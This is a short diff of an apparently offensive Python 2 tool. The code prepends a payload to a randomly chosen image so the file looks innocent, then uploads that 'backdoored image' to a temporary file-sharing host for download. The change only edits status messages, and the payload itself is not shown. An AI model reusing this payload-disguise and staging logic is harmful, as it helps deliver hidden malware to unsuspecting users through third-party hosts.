@@ -147,12 +147,13 @@ image = random.choice(os.listdir("stubs/images"))
 with open('stubs/images/' + image, 'rb') as di:
 	imagedata = di.read()
 imagelen = str(len(imagedata))
+print ' [>] Backdooring random image %s..' % image
 downpayload = imagedata + downpayload
 
 if not args.customurl:
 	with open(image, 'wb') as df:
 		df.write(downpayload)
-	print ' [^] Uploading backdoored image %s to tempsend..' % image
+	print ' [^] Uploading to tempsend..'
 	downurl = ftempsend(image)
 	print ' [*] Uploaded to %s to expire in 1 %s.' % (downurl,expirestr)
 	os.remove(image)
